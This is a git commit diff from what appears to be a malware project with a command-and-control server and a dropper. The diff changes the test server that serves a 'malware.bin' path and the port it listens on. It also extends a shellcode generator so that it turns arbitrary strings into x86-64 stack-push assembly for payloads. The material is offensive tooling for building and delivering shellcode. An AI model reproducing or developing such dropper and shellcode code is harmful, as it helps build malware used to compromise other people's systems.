f2c6bf9f1e3f795e3cdefddbd21d289cd7244162
rbapat <rohanbap@gmail.com>
2022-05-04 02:11:49 -0400

    Changed dropper GET request to /static/...

--- C2/src/test/server.py
+++ C2/src/test/server.py
@@ -3,10 +3,6 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 class Serv(BaseHTTPRequestHandler):
 
     def do_GET(self):
-        print(self.path)
-        if self.path == '/malware.bin':
-            #self.path = '/test.txt'
-            self.path = '/hello_world'
         try:
             file_to_open = open(self.path[1:], 'rb').read()
             self.send_response(200)
@@ -18,7 +14,7 @@ class Serv(BaseHTTPRequestHandler):
         self.wfile.write(file_to_open)
 
 def main():
-    httpd = HTTPServer(('localhost',8000),Serv)
+    httpd = HTTPServer(('localhost',5000),Serv)
     httpd.serve_forever()
 
 if __name__ == '__main__':
--- dropper/shellcode.py
+++ dropper/shellcode.py
@@ -1,4 +1,22 @@
 import argparse
+import os
+
+def build_hex_list(lst):
+    long_bytes = [lst[i:i+8] for i in range(0, len(lst), 8)]
+
+    out = []
+    for lst in long_bytes:
+        lst.reverse()
+        s = ''
+        for b in lst:
+            c = format(b, 'x')
+            if len(c) == 1:
+                c = '0' + c
+            s += c
+
+        out.append(s)
+
+    return out
 
 def build_shellcode(asm_bytes):
     out_str = '['
@@ -19,11 +37,26 @@ def build_shellcode(asm_bytes):
     return out_str
 
 def main(bin_path):
-    with open(bin_path, 'rb') as f:
-        asm_bytes = list(f.read())
-    
-    shellcode = build_shellcode(asm_bytes)
-    print(shellcode)
+    if os.path.exists(bin_path):
+        with open(bin_path, 'rb') as f:
+            asm_bytes = list(f.read())
+        
+        shellcode = build_shellcode(asm_bytes)
+        print(shellcode)
+    else:
+        bin_path = bin_path.replace('\\r', '\r').replace('\\n', '\n')
+        print(f"{bin_path} doesn't exist on disk, assuming it is a string")
+
+        hex_lst = build_hex_list([ord(c) for c in bin_path])
+        hex_lst.reverse()
+
+        print(f"Length: {len(bin_path)}\n")
+        for long_val in hex_lst:
+            print(f"mov $0x{long_val}, %rsi")
+            print(f"push %rsi")
+        
+
+        
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
